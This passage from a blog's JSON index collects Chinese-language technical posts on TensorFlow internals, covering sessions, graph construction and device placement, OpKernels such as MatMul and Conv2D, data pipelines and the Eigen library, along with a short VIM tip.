sess-&gt;Create(graph);if (!s.ok()) &#123; ... &#125;// run stepstd::vector&lt;tensorflow::Tensor&gt; outputs;s = session-&gt;Run(&#123;&#125;, // inputs is empty &#123;\"output:0\"&#125;, // outputs names&#123;\"update_state\"&#125;, // target names&amp;outputs); // output tensorsif (!s.ok()) &#123; ... &#125;// closesession-&gt;Close(); 创建会话 上文介绍了Session创建的详细过程，从Python前端为起点，通过Swig自动生成的Python-C++的包装器为媒介，实现了Python到TensorFlow的C API的调用。 其中，C API是前端系统与后端系统的分水岭。后端C++系统根据前端传递的Session.target，使用SessionFactory多态创建Session(C++)对象。 创建会话 从严格的角色意义上划分，GrpcSession依然扮演了Client的角色。它使用target，通过RPC协议与Master建立通信连接，因此，GrpcSession同时扮演了RPC Client的角色。 创建/扩展图随后，Python前端将调用Session.run接口，将构造好的计算图，以GraphDef的形式发送给C++后端。 其中，前端每次调用Session.run接口时，都会试图将新增节点的计算图发送给后端系统，以便后端系统将新增节点的计算图Extend到原来的计算图中。特殊地，在首次调用Session.run时，将发送整个计算图给后端系统。 后端系统首次调用Session.Extend时，转调(或等价)Session.Create；以后，后端系统每次调用Session.Extend时将真正执行Extend的语义，将新增的计算图的节点追加至原来的计算图中。 随后，后端将启动计算图执行的准备工作。 迭代运行接着，Python前端Session.run实现将Feed, Fetch列表准备好，传递给后端系统。后端系统调用Session.Run接口。 后端系统的一次Session.Run执行常常被称为一次Step，Step的执行过程是TensorFlow运行时的核心。 每次Step，计算图将正向计算网络的输出，反向传递梯度，并完成一次训练参数的更新。首先，后端系统根据Feed, Fetch，对计算图(常称为Full Graph)进行剪枝，得到一个最小依赖的计算子图(常称为Client Graph)。 然后，运行时启动设备分配算法，如果节点之间的边横跨设备，则将该边分裂，插入相应的Send与Recv节点，实现跨设备节点的通信机制。 随后，将分裂出来的子图片段(常称为Partition Graph)注册到相应的设备上，并在本地设备上启动子图片段的执行过程。 当计算图执行完毕后，需要关闭Session，以便释放后端的系统资源，包括队列，IO等。会话关闭流程较为简单，如下图所示。 销毁会话最后，会话关闭之后，Python前端系统启动GC，当Session.del被调用后，启动后台C++的Session对象销毁过程。","tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://larryim.cc/tags/tensorflow/"}],"categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://larryim.cc/categories/TensorFlow/"}]},{"title":"5 TF - Graph模块","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TensorFlow-5-TF-Graph模块/","text":"转自 #5. TF - Graph模块 TF把神经网络模型表达成一张拓扑结构的Graph，Graph中的一个节点表示一种计算算子。Graph从输入到输出的Tensor数据流动完成了一个运算过程，这是对类似概率图、神经网络等连接式算法很好的表达，同时也是对Tensor + Flow的直观解释。 ##5.1 Graph视图 Tensorflow采用符号化编程，形式化为Graph计算图。Graph包含节点（Node）、边（Edge）、NameScope、子图（SubGraph），图 5-1是Graph的拓扑描述。 Ø 节点分为计算节点(Compute Node)、起始点（Source Node）、终止点（Sink Node）。起始点入度为0，终止点出度为0。 Ø NameScope为节点创建层次化的名称，图 3 4中的NameSpace类型节点就是其中一种体现。 Ø 边分为普通边和依赖边（Dependecy Edge）。依赖边表示对指定的计算节点有依赖性，必须等待指定的节点计算完成才能开始依赖边的计算。 图 5 2是Graph的UML视图模型，左侧GraphDef类为protobuf中定义的graph结构，可将graph结构序列化和反序列化处理，用于模型保存、模型加载、分布式数据传输。右侧Graph类为/core/graph模块中定义的graph结构，完成graph相关操作，如构建(construct)，剪枝(pruning)、划分(partitioning)、优化(optimize)、运行(execute)等。GraphDef类和Graph类可以相关转换，如图中中间部分描述，函数Graph::ToGraphDef()将Graph转换为GraphDef，函数ConvertGraphDefToGraph将GraphDef转换为Graph，借助这种转换就能实现Graph结构的网络传输。 Graph-UML图中还定义了Node和Edge。Node定义函数操作和属性信息，Edge连接源节点和目标节点。类NodeDef中定义了Op、Input、Device、Attr信息，其中Device可能是CPU、GPU设备，甚至是ARM架构的设备，说明Node是与设备绑定的。类FunctionDefLibrary主要是为了描述各种Op的运算，包括Op的正向计算和梯度计算。FunctionDef的定义描述见图 5 3。 图 5-4是FunctionDef举例，对MatMulGrad的梯度描述，其中包含函数参数定义、函数返回值定义、模板数据类型定义、节点计算逻辑。 5.2 Graph构建 有向图（DAG）由节点和有向边组成。本章节主要讲述TF如何利用组合成完整的graph的。假设有如下计算表达式：t1=MatMul(input, W1)。 图 5-5中图计算表达式包含3个节点，2条边，描述为字符串形式如下。 123node &#123;name: &apos;W1&apos; op: &apos;TestParams&apos;&#125;,node &#123;name: &apos;input&apos; op: &apos;TestInput&apos; input:[&apos;^W1&apos;]&#125;,node &#123;name: &apos;t1&apos; op: &apos;MatMul&apos; input:[&apos;^W1&apos;, &apos;input:1&apos;]&#125;, TF先调用protobuf的解析方法将graph的字符串描述解析并生成GraphDef实例。 1protobuf::TextFormat::ParseFromString(gdef_str, &amp;gdef_) 然后将GraphDef实例转化为tensorflow::Graph实例，这个过程由tensorflow::GraphConstructor类完成。GraphConstructor先判别node的字符串格式是否正确，然后执行convert函数。 12GraphConstructor::Convert()[graph/graph_constructor.cc] 首先，按拓扑图的顺序逐步添加node和edge到graph中。 123Graph:: AddNode(const NodeDef&amp; node_def, Status* status)Graph:: AddEdge(Node* source, int x, Node* dest, int y) [graph/graph.cc] 然后，找出所有起始点（source node）和终止点（sink node）。 12FixupSourceAndSinkEdges(Graph* g) [graph/algorithms.cc] 接着，对graph进行优化。图优化部分请参考章节6.5。 12OptimizeCSE(Graph* g, std::function&lt;bool(const Node*)&gt; consider_fn); [graph/optimizer_cse.cc] TF的graph构建模块测试用例在core/graph/graph_constructor_test.cc文件中。 12$ bazel build -c dbg //tensorflow/core/graph_graph_constor_test$ gdb bazel-bin/tensorflow/core/graph_graph_constructor_test ##5.3 Graph局部执行 Graph的局部执行特性允许使用者从任意一个节点输入（feed），并指定目标输出节点（fetch）。图 5 6是TF白皮书中描述Graph局部执行的图。[15] 图 5-6中左侧为计算图，如果要实现f=F(c)运算，代码如下： 1result=sess.run(f, feed_dict=&#123;c:input&#125;) TF是如何知道两个点之间的计算路径呢？这里涉及传递闭包的概念。传递闭包就是根据graph中节点集合和有向边的集合，找出从节点A到节点B的最小传递关系。如上图中，点a到点f的传递闭包是a -&gt; c -&gt; f。 Graph局部执行过程就是找到feed和fetch的最小传递闭包，这个传递闭包相当于原graph的subgraph。代码文件在graph/http://subgraph.cc中，函数RewriteGraphForExecution()在确定feed节点和fetch节点后，通过剪枝得到最小传递子图。 12PruneForTargets(g, name_index, fetch_nodes, target_node_names)); [graph/subgraph.cc] 剪枝操作的实现函数如下，Graph通过模拟计算流标记出节点是否被访问，剔除未被访问的节点。 12PruneForReverseReachability(Graph* g, std::unordered_set&lt;const Node*&gt; visited)[graph/algorithm.cc] ##5.4 Graph设备分配 TF具有高度设备兼容性，支持X86和Arm架构，支持CPU、GPU运算，可运行于Linux、MacOS、Android和IOS系统。而且，TF的设备无关性特征在多设备分布式运行上也非常有用。 Graph中每个节点都分配有设备编号，表示该节点在相应设备上完成计算操作。用户既可以手动指定节点设备，也可以利用TF自动分配算法完成节点设备分配。设备自动算法需要权衡数据传输代价和计算设备的平衡，尽可能充分利用计算设备，减少数据传输代价，从而提高计算性能。 Graph设备分配用于管理多设备分布式运行时，哪些节点运行在哪个设备上。TF设备分配算法有两种实现算法，第一种是简单布放算法（Simple Placer），第二种基于代价模型（Cost Model）评估。简单布放算法按照指定规则布放，比较简单粗放，是早期版本的TF使用的模型，并逐步被代价模型方法代替。 ###5.4.1 Simple Placer算法 TF实现的Simple Placer设备分配算法使用union-find方法和启发式方法将部分不相交且待分配设备的Op节点集合合并，并分配到合适的设备上。 Union-find（联合-查找）算法是并查集数据结构一种应用。并查集是一种树型的数据结构，其保持着用于处理一些不相交集合（Disjoint Sets）的合并及查询问题。Union-find定义了两种基本操作：Union和Find。 Find：确定元素属于哪一个子集。它可以被用来确定两个元素是否属于同一子集。 Union：将两个子集合并成同一个集合。即将一个集合的根节点的父指针指向另一个集合的根节点。 启发式算法（Heuristic Algorithm）定义了节点分配的基本规则。Simple Placer算法默认将起始点和终止点分配给CPU，其他节点中GPU的分配优先级高于CPU，且默认分配给GPU:0。启发式规则适用于以下两种场景： 对于符合GeneratorNode条件（0-indegree, 1-outdegree, not ref-type）的节点，让node与target_node所在device一致，参见图 5 7。 对于符合MetaDataNode条件（即直接在原数据上的操作，如reshape）的节点，让node与source_node所在device一致，参见图 5 8。 TF中Simple Placer的实现定义在文件core/common_runtime/simple_placer.cc。文件中主要定义了两个类：ColocationGraph和SimplePlacer。ColocationGraph类利用Union-find算法将节点子集合合并成一个节点集合，参考成员函数ColocationGraph:: ColocateNodes实现。SimplePlacer类实现节点分配过程，下面将主要介绍SimplePlacer:: Run()函数的实现过程。 1SimplePlacer::Run() 首先，将graph中的node加入到ColocationGraph实例中，不包含起始点和终止点。 12ColocationGraph colocation_graph(graph_, devices_, options_);colocation_graph.AddNode(*node);[for node in _graph] 然后，找出graph中受constraint的edge(即src_node被指定了device的edge)，强制将dst_node指定到src_node所在的device。 1colocation_graph.ColocateNodes(*edge-&gt;src(), *node); 最后，根据graph中已有的constraint条件为每个no-constraint的node指定device。 12if IsGeneratorNode(node) AssignAndLog(assigned_device, node);if IsMetadataNode(node) AssignAndLog(assigned_device, node); Simple Placer的测试用例core/common_runtime/simple_placer_test.cc)文件，要调试这个测试用例，可通过如下方式： 12$ bazel buid -c dbg //tensorflow/core:common_runtime_simple_placer_test$ gdb bazel-bin/tensorflow/core/common_runtime_simple_placer_test ###5.4.2 代价模型 TF使用代价模型（Cost Model）会在计算流图生成的时候模拟每个device上的负载，并利用启发式策略估计device上的完成时间，最终找出预估时间最低的graph设备分配方案。[1] Cost model预估时间的方法有两种： Ø 使用启发式的算法，通过把输入和输出的类型以及tensor的大小输入进去，得到时间的预估 Ø 使用模拟的方法，对图的计算进行一个模拟，得到各个计算在其可用的设备上的时间。 启发式策略会根据如下数据调整device的分配：节点任务执行的总时间；单个节点任务执行的累计时间；单个节点输出数据的尺寸。 TF中代价模型的实现定义在文件core/graph/http://costmodel.cc和core/common_runtime/ http://costmodel_manager.cc，其UML视图参见图 5 9。 Cost model manager从graph创建cost model，再评估计算时间，如下。 123456Void ConstModel:: InitFromGraph(const Graph&amp; g)&#123; AddNodesToCostModel(g, this); AssignSizes(g, this); EstimateComputationCosts(g, this); CheckInitialized(g);&#125; 其中评估时间的函数EstimateComputationCosts是对graph中每个node依次评估，节点计算时间评估函数如下。 1TimeEstimateForNode(CostModel* cost_model, Node* n) ##5.5 Graph优化 Graph优化算法利用一些优化策略，降低graph的计算复杂度和空间复杂度，提高graph运行速度。 Graph优化算法的实现在文件core/common_runtime/graph_optimizer.cc)。 12GraphOptimizer::Optimize(FunctionLibraryRuntime* runtime, Device* device, Graph** graph) Graph优化策略有三种： Common Subexpression Elimination (CSE, 公共子表达式消除)如果一个表达式E已经计算过了，并且从先前的计算到现在的E中的变量都没有发生变化，那么E的此次出现就成为了公共子表达式。例如：x=(a+c)12+(c+a)2; 可优化为 x=E*14。 CSE实现函数如下，具体细节参考文献[16]。 123OptimizeCSE(Graph* g, std:: function&lt;bool(const Node*)&gt; consider_fn); [graph/optimizer_cse.cc] CSE测试用例在文件graph/http://optimizer_cse_test.cc中，调试方法： 12$ bazel build -c dbg //tensorflow/core:graph_optimizer_cse_test$ gdb bazel-bin/tensorflow/core/graph_optimizer_cse_test Constant Folding (常量合并)在编译优化时，变量如果能够直接计算出结果，那么变量将有常量直接替换。例如：a=3+1-3*1; 可优化为a=1。 常量合并的实现函数如下。 常量合并的测试用例在common_runtime/constant_folding_test.cc)中，调试方法： Function Inlining (函数内联)函数内联处理可减少方法调用的成本。在TF中包含以下几种方法： RemoveListArrayConverter(g)：” Rewrites _ListToArray and _ArrayToList to a set of Identity nodes”. RemoveDeadNodes(g)：删除DeatNode。DeatNode的特征是”not statefull, not _Arg, not reachable from _Retval”. RemoveIdentityNodes(g)：删除Identity节点。如n2=Identity(n1) + Identity(n1); 优化后: n2=n1 + n1; FixupSourceAndSinkEdges(g)：固定source和sink的边 ExpandInlineFunctions(runtime, g)：展开内联函数的嵌套调用 其中_ListToArray、_ArrayToList、_Arg、_Retval均在core/ops/function_ops.cc)中定义。 Graph优化相关测试文件在common_runtime/function_test.cc)，调试方法： 12$ bazel build -c dbg //tensorflow/core:common_runtime_function_test$ gdb bazel-bin /tensorflow/core/common_runtime_function_test","tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://larryim.cc/tags/tensorflow/"}],"categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://larryim.cc/categories/TensorFlow/"}]},{"title":"VIM技巧","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TOOLS-VIM技巧/","text":"粘贴变形 :set paste","tags":[{"name":"VIM","slug":"VIM","permalink":"http://larryim.cc/tags/VIM/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"4 TF OpKernels简介","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TensorFlow-4-OpKernels简介/","text":"OpKernel类（core/framework/op_kernel.h）是所有Op类的基类。继承OpKernel还可以自定义新的Op类。用的较多的Op如（MatMul, Conv2D, SoftMax, AvgPooling, Argmax等）。 所有Op包含注册（Register Op）和实现（正向计算、梯度定义）两部分。 所有Op类的实现需要overide抽象基函数 void Compute(OpKernelContext* context)，实现自身Op功能。用户可以根据需要自定义新的Op操作，参考[12]。 TF中所有Op操作的属性定义和描述都在 ops/ops.pbtxt。如下Add操作，定义了输入参数x、y，输出参数z。 4.2 UnaryOp &amp; BinaryOpUnaryOp和BinaryOp定义了简单的一元操作和二元操作，类定义在/core/kernels/ cwise_ops.h文件，类实现在/core/kernels/cwiseop*.cc类型的文件中，如cwise_op_sin.cc文件。 一元操作全称为Coefficient-wise unary operations，一元运算有abs， sqrt， exp， sin， cos，conj（共轭）等。如abs的基本定义： 二元操作全称为Coefficient-wise binary operations，二元运算有add，sub， div， mul，mod等。如sum的基本定义： 4.3 MatMul4.3.1 Python相关部分在Python脚本中定义matmul运算： 根据Ops名称MatMul从Ops库中找出对应Ops类型 创建ops节点 创建ops节点并指定相关属性和设备分配 4.3.2 C++相关部分Python脚本通过swig调用进入C接口API文件core/client/tensor_c_api.cc，调用TF_NewNode函数生成节点，同时还需要指定输入变量，TF_AddInput函数设置first输入变量，TF_AddInputList函数设置other输入变量。这里op_type为MatMul，first输入变量为a，other输入变量为b。 创建节点根据节点类型从注册的Ops工厂中生成，即TF通过工厂模式把一系列Ops注册到Ops工厂中。其中MatMul的注册函数为如下 4.3.3 MatMul正向计算MatMul的实现部分在core/kernels/matmul_op.cc文件中，类MatMulOp继承于OpKernel，成员函数Compute完成计算操作。 MatMul的测试用例core/kernels/matmul_op_test.cc文件，要调试这个测试用例，可通过如下方式： 在TF中MatMul实现了CPU和GPU两个版本，其中CPU版本使用Eigen库，GPU版本使用cuBLAS库。 CPU版的MatMul使用Eigen库，调用方式如下： 简而言之就是调用eigen的constract函数。 GPU版的MatMul使用cuBLAS库，准确而言是基于cuBLAS的stream_executor库。Stream executor是google开发的开源并行计算库，调用方式如下： 其中stream类似于设备句柄，可以调用stream executor中的cuda模块完成运算。 4.3.4 MatMul梯度计算MatMul的梯度计算本质上也是一种kernel ops，描述为MatMulGrad。MatMulgrad操作是定义在grad_ops工厂中，类似于ops工厂。定义方式如下： MatmulGrad由FDH（Function Define Helper）完成定义， 其中attr_adj_x=”transpose_a” ax0=false, ax1=true, attr_adj_y= “transpose_b”, ay0=true, ay1=false, *g属于FunctionDef类，包含MatMul的梯度定义。 从FDH定义中可以看出MatMulGrad本质上还是MatMul操作。在矩阵求导运算中： MatMulGrad的测试用例core/ops/math_grad_test.cc文件，要调试这个测试用例，可通过如下方式： 4.4 Conv2d关于conv2d的python调用部分和C++创建部分可参考MatMul中的描述。 4.4.1 Conv2d正向计算部分TF中conv2d接口如下所示，简单易用： 实现部分在core/kernels/conv_ops.cc文件中，类Conv2DOp继承于抽象基类OpKernel。Conv2DOp的测试用例core/kernels/eigen_spatial_convolutions_test.cc文件，要调试这个测试用例，可通过如下方式： Conv2DOp的成员函数Compute完成计算操作。 Conv2Dop::Compute(OpKernelContect* context) 为方便描述，假设tf.nn.conv2d中input参数的shape为[batch, in_rows, in_cols, in_depth]，filter参数的shape为[filter_rows, filter_cols, in_depth, out_depth]。 首先，计算卷积运算后输出tensor的shape。 Ø 若padding=VALID，output_size = (input_size - filter_size + stride) / stride; Ø 若padding=SAME，output_size = (input_size + stride - 1) / stride; 其次，根据计算结果给输出tensor分配内存。 然后，开始卷积计算。Conv2DOp实现了CPU和GPU两种模式下的卷积运算。同时，还需要注意input tensor的输入格式，通常有NHWC和NCHW两种格式。在TF中，Conv2d-CPU模式下目前仅支持NHWC格式，即[Number, Height, Weight, Channel]格式。Conv2d-GPU模式下以NCHW为主，但支持将NHWC转换为NCHW求解。C++中多维数组是row-major顺序存储的，而Eigen默认是col-major顺序的，则C++中[N, H, W, C]相当于Eigen中的[C, W, H, N]，即dimention order是相反的，需要特别注意。 Conv2d-CPU模式下调用Eigen库函数。 Eigen库中卷积函数的详细代码参见图 4 2。 图 4 2 Eigen卷积运算的定义 Ø Tensor::extract_image_patches() 为卷积或池化操作抽取与kernel size一致的image patches。该函数的定义在eigen3/unsupported/Eigen/CXX11/src/Tensor/ TensorBase.h中，参考该目录下ReadME.md。 Ø Tensor::extract_image_patches() 的输出与input tensor的data layout有关。设input tensor为ColMajor格式[NHWC]，则image patches输出为[batch, filter_index, filter_rows, filter_cols, in_depth]，并reshape为[batch filter_index, filter_rows filter_cols in_depth]，而kernels维度为[filter_rows filter_cols in_depth, out_depth]，然后kernels矩阵乘image patches得到输出矩阵[batch filter_index, out_depth]，并reshape为[batch, out_rows, out_cols, out_depth]。 Conv2d-GPU模式下调用基于cuDNN的stream_executor库。若input tensor为NHWC格式的，则先转换为NCHW格式 调用cudnn库实现卷积运算： 计算完成后再转换成HHWC格式的 4.4.2 Conv2d梯度计算部分 Conv2D梯度计算公式，假设output=Conv2d(input, filter)，则 Conv2D梯度计算的测试用例core/kernels/eigen_backward_spatial_convolutions_test.cc文件，要调试这个测试用例，可通过如下方式： Conv2d的梯度计算函数描述为Conv2DGrad。Conv2DGrad操作定义在grad_ops工厂中。注册方式如下： Conv2DGrad由FDH（Function Define Helper）完成定义，参见图 4 3。 图 4 3 Conv2DGrad的函数定义 Conv2DGrad梯度函数定义中依赖Conv2DBackpropInput和Conv2DBackpropFilter两种Ops，二者均定义在kernels/conv_grad_ops.cc文件中。 Conv2DBackpropInputOp和Conv2DBackpropFilterOp的实现分为GPU和CPU版本。 Conv2D运算的GPU版实现定义在类Conv2DSlowBackpropInputOp和类Conv2DSlowBackprop FilterOp 中。 Conv2D运算的CPU版有两种实现形式，分别为custom模式和fast模式。Custom模式基于贾扬清在caffe中的思路实现，相关类是Conv2DCustomBackpropInputOp和Conv2DCustomBackpropFilterOp。Fast模式基于Eigen计算库，由于在GPU下会出现nvcc编译超时，目前仅适用于CPU环境，相关类是Conv2DFastBackpropInputOp和Conv2DFastBackpropFilterOp。 根据Conv2DGrad的函数定义，从代码分析Conv2D-GPU版的实现代码，即分析Conv2DBackpropInput和Conv2DBackpropFilter的实现方式。 Conv2DSlowBackpropInputOp的成员函数Compute完成计算操作。 Compute实现部分调用stream executor的相关函数，需要先获取库的stream句柄，再调用卷积梯度函数。 stream executor在卷积梯度运算部分仍然是借助cudnn库实现的。 4.4.3 MaxPooling计算部分 在很多图像分类和识别问题中都用到了池化运算，池化操作主要有最大池化（max pooling）和均值池化（avg pooling），本章节主要介绍最大池化的实现方法。调用TF接口可以很容易实现池化操作。 类MaxPoolingOp继承于类OpKernel，成员函数Compute实现了最大池化运算。 最大池化运算调用Eigen库实现。 Eigen库中最大池化的详细描述如下： 其中最大池化运算主要分为两步，第一步中extract_image_patch为池化操作抽取与kernel size一致的image patches，第二步计算每个image patch的最大值。 4.5 SendOp &amp; RecvOp TF所有操作都是节点形式表示的，包括计算节点和非计算节点。在跨设备通信中，发送节点（SendOp）和接收节点（RecvOp）为不同设备的两个相邻节点完成完成数据通信操作。Send和Recv通过TCP或RDMA来传输数据。 TF采用Rendezvous（回合）通信机制，Rendezvous类似生产者/消费者的消息信箱。引用TF描述如下： TF的消息传递属于采用“发送不阻塞/接收阻塞”机制，实现场景有LocalRendezvous（本地消息传递）、RpcRemoteRendezvous (分布式消息传递)。除此之外还有IntraProcessRendezvous用于本地不同设备间通信。 TF会在不同设备的两个相邻节点之间添加Send和Recv节点，通过Send和Recv之间进行通信来达到op之间通信的效果，如图 4 4右子图所示。图中还涉及到一个优化问题，即a-&gt;b和a-&gt;c需要建立两组send/recv连接的，但两组连接是可以共用的，所以合并成一组连接。 图 4 4 Graph跨设备通信 Send和Recv分别对应OpKernel中的SendOp和RecvOp两个类(kernels/sendrecv_ops.h)。SendOp的计算函数。 SendOp作为发送方需要先获取封装ctx消息，然后借助Rendezvous模块发送给接收方。 RecvOp的计算函数如下。 RecvOp作为接收方借助Rendezvous模块获取ctx消息。 其中parsed变量是类ParsedKey的实例。图 5‑5是Rendezvous封装的ParsedKey消息实体示例。 4.6 ReaderOp &amp; QueueOp 4.6.1 TF数据读取 TF系统定义了三种数据读取方式[13]： Ø 供给数据(Feeding)： 在TensorFlow程序运行的每一步， 通过feed_dict来供给数据。 Ø 从文件读取数据： 在TensorFlow图的起始， 让一个输入管线（piplines）从文件中读取数据放入队列，通过QueueRunner供给数据，其中队列可以实现多线程异步计算。 Ø 预加载数据： 在TensorFlow图中定义常量或变量来保存所有数据，如Mnist数据集（仅适用于数据量比较小的情况）。 除了以上三种数据读取方式外，TF还支持用户自定义数据读取方式，即继承ReaderOpKernel类创建新的输入读取类[14]。本章节主要讲述通过piplines方式读取数据的方法。 Piplines利用队列实现异步计算 从piplines读取数据也有两种方式：一种是读取所有样本文件路径名转换成string tensor，使用input_producer将tensor乱序（shuffle）或slice（切片）处理放入队列中；另一种是将数据转化为TF标准输入格式，即使用TFRecordWriter将样本数据写入tfrecords文件中，再使用TFRecordReader将tfrecords文件读取到队列中。 图 4 6描述了piplines读取数据的第一种方式，这些流程通过节点和边串联起来，成为graph数据流的一部分。 从左向右，第一步是载入文件列表，使用convert_to_tensor函数将文件列表转化为tensor，如cifar10数据集中的image_files_tensor和label_tensor。 第二步是使用input_producer将image_files_tensor和label_tensor放入图中的文件队列中，这里的input_producer作用就是将样本放入队列节点中，有string_input_producer、range_input_producer和slice_input_producer三种，其中slice_input_producer的切片功能支持乱序，其他两种需要借助tf.train.shuffle_batch函数作乱序处理，有关三种方式的具体描述可参考tensorflow/python/training/input.py注释说明。 第三步是使用tf.read_file()读取队列中的文件数据到内存中，使用解码器如tf.image.decode_jpeg()解码成[height, width, channels]格式的数据。 最后就是使用batch函数将样本数据处理成一批批的样本，然后使用session执行训练。 图 4 6 使用piplines读取数据 4.6.2 TFRecords使用 TFRecords是TF支持的标准文件格式，这种格式允许将任意的数据转换为TFRecords支持的文件格式。TFRecords方法需要两步：第一步是使用TFRecordWriter将样本数据写入tfrecords文件中，第二步是使用TFRecordReader将tfrecords文件读取到队列中。 图 4 7是TFRecords文件写入的简单示例。tf.train.Example将数据填入到Example协议内存块(protocol buffer)，将协议内存块序列化为一个字符串，通过TFRecordWriter写入到TFRecords文件，图中定义了label和image_raw两个feature。Example协议内存块的定义请参考文件core/example/example.proto。 图 4 7 TFRecordWriter写入数据示例 图 4 8是TFRecords文件读取的简单示例。tf.parse_single_example解析器将Example协议内存块解析为张量，放入example队列中，其中features命名和类型要与Example写入的一致。 图 4 8 TFRecrodReader读取数据示例 4.6.3 ReaderOps分析 ReaderOpsKernel类封装了数据读取的入口函数Compute，通过继承ReaderOpsKernel类可实现各种自定义的数据读取方法。图 4 9是ReaderOp相关的UML视图。 图 4 9 ReaderOp相关的UML视图 ReaderOpKernel子类必须重新定义成员函数SetReaderFactory实现对应的数据读取逻辑。TFRecordReaderOp的读取方法定义在TFRecordReader类中。 TFRecordReader调用RecordReader::ReadRecord()函数逐步读取.tfrecord文件中的数据，每读取一次，offset向后移动一定长度。 其中offset的计算方式。","tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://larryim.cc/tags/tensorflow/"}],"categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://larryim.cc/categories/TensorFlow/"}]},{"title":"3 TF代码分析初步","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TensorFlow-3-代码分析初步/","text":"3.1 TF总体概述为了对TF有整体描述，本章节将选取TF白皮书中的示例展开说明，如图 3-1所示是一个简单线性模型的TF正向计算图和反向计算图。图中x是输入，W是参数权值，b是偏差值，MatMul和Add是计算操作，dMatMul和dAdd是梯度计算操作，C是正向计算的目标函数，1是反向计算的初始值，dC/dW和dC/dx是模型参数的梯度函数。 以图 3-1为例实现的TF代码见图 3-2。首先声明参数变量W、b和输入变量x，构建线性模型$y=W*x+b$，目标函数loss采用误差平方和最小化方法，优化函数optimizer采用随机梯度下降方法。然后初始化全局参数变量，利用session与master交互实现图计算。 图 3-2中summary可以记录graph元信息和tensor数据信息，再利用Tensorboard分析模型结构和训练参数。 图 3-3是上述代码在Tensorboard中记录下的Tensor跟踪图。Tensorboard可以显示scaler和histogram两种形式。跟踪变量走势可更方便的分析模型和调整参数。 图 3-4是图 3-1示例在Tensorboard中显示的graph图。左侧子图描述的正向计算图和反向计算图，正向计算的输出被用于反向计算的输入，其中MatMul对应MatMul_grad，Add对应Add_grad等。右上侧子图指明了目标函数最小化训练过程中要更新的模型参数W、b，右下侧子图是参数节点W、b展开后的结果。 图 3-4中，参数W是命名空间（Namespace）类型，展开后的W主要由Assign和Read两个OpNode组成，分别负责W的赋值和读取任务。 命名空间gradients是隐含的反向计算图，定义了反向计算的计算逻辑。从图 3-1可以看出，更新参数W需要先计算dMatMul，即图 3-4中的MatMul_grad操作，而Update_W节点负责更新W操作。为了进一步了解UpdateW的逻辑，图 3-5对MatMul_grad和update_W进行了展开分析。 图 3-5中，子图(a)描述了MatMul_grad计算逻辑，子图(b)描述了MatMul_grad输入输出，子图(c)描述了update_W的计算逻辑。首先明确MatMul矩阵运算法则，假设 z=MatMul(x, y)，则有dx = MatMul(dz, y)，dy = MatMul(x, dz)，由此可以推出dW=MatMul(dAdd, x)。在子图(a)中左下侧的节点b就是输入节点x，dAdd由Add_grad计算输出。update_W的计算逻辑由最优化函数指定，而其中的minimize/update_W/ApplyGradientDescent变量决定，即子图(b)中的输出变量Outputs。 另外，在MatMul_grad/tuple命名空间中还隐式声明了control dependencies控制依赖操作，这在章节2.4控制流中相关说明。 3.2 Eigen介绍在Tensorflow中核心数据结构和运算主要依赖于Eigen和Stream Executor库，其中Eigen支持CPU和GPU加速计算，Stream Executor主要用于GPU环境加速计算。下面简单讲述Eigen库的相关特性，有助于进一步理解Tensorflow。 3.2.1 Eigen简述Eigen是高效易用的C++开源库，有效支持线性代数，矩阵和矢量运算，数值分析及其相关的算法。不依赖于任何其他依赖包，安装使用都很简便[8]。具有如下特性： 支持整数、浮点数、复数，使用模板编程，可以为特殊的数据结构提供矩阵操作。比如在用ceres-solver进行做优化问题（比如bundle adjustment）的时候，有时候需要用模板编程写一个目标函数，ceres可以将模板自动替换为内部的一个可以自动求微分的特殊的double类型。而如果要在这个模板函数中进行矩阵计算，使用Eigen就会非常方便。 支持逐元素、分块、和整体的矩阵操作。 内含大量矩阵分解算法包括LU，LDLt，QR、SVD等等。 支持使用Intel MKL加速 部分功能支持多线程 稀疏矩阵支持良好，到今年新出的Eigen3.2，已经自带了SparseLU、SparseQR、共轭梯度Tensor（ConjugateGradient solver）、bi conjugate gradient stabilized solver等解稀疏矩阵的功能。同时提供SPQR、UmfPack等外部稀疏矩阵库的接口。 支持常用几何运算，包括旋转矩阵、四元数、矩阵变换、AngleAxis（欧拉角与Rodrigues变换）等等。 更新活跃，用户众多（Google、WilliowGarage也在用），使用Eigen的比较著名的开源项目有ROS（机器人操作系统）、PCL（点云处理库）、Google Ceres（优化算法）。OpenCV自带到Eigen的接口。 Eigen库包含Eigen模块和unsupported模块，其中Eigen模块为official module，unsupported模块为开源贡献者开发的。 Eigenunsupported 模块中定义了数据类型Tensor及相关函数，包括Tensor的存储格式，Tensor的符号表示，Tensor的编译加速，Tensor的一元运算、二元运算、高维度泛化矩阵运算，Tensor的表达式计算。本章后续所述Tensor均为Eigen::Tensor Eigen运算性能评估如图 3-6所示，eigen3的整体性能比eigen2有很大提升，与GOTO2、INTEL_MKL基本持平。 3.2.2 Eigen 存储顺序Eigen中的Tensor支持两种存储方式: Row-major表示矩阵存储时按照row-by-row的方式。 Col-major表示矩阵存储时按照column-by-column的方式。 Eigen默认采用Col-major格式存储的（虽然也支持Row-major，但不推荐），具体采用什么存储方式取决于算法本身是行遍历还是列遍历为主。例如：A=[[a11, a12, a13], [a21, a22, a23]]的存储序列见图3-7。 3.2.3 Eigen 惰性求值在编程语言理论中，存在及早求值(Eager Evaluation) 和惰性求值（Lazy Evaluation） 及早求值：大多数编程语言所拥有的普通计算方式 惰性求值：也认为是“延迟求值”，可以提高计算性能，最重要的好处是它可以构造一个无限的数据类型。 关于惰性求值，举例如下： Vec3 = vec1 + vec2; 及早求值形式需要临时变量vec_temp存储运算结果，再赋值给vec3，计算效率和空间效率都不高： Vec_temp = vec1 + vec2; Vec3 = vec_temp 而惰性求值不需要临时变量保存中间结果，提高了计算性能： Vec_symbol_3 = (vec_symbol_1 + vec_symbol_2); Vec3 = vec_symbol_3.eval(vec1, vec2) 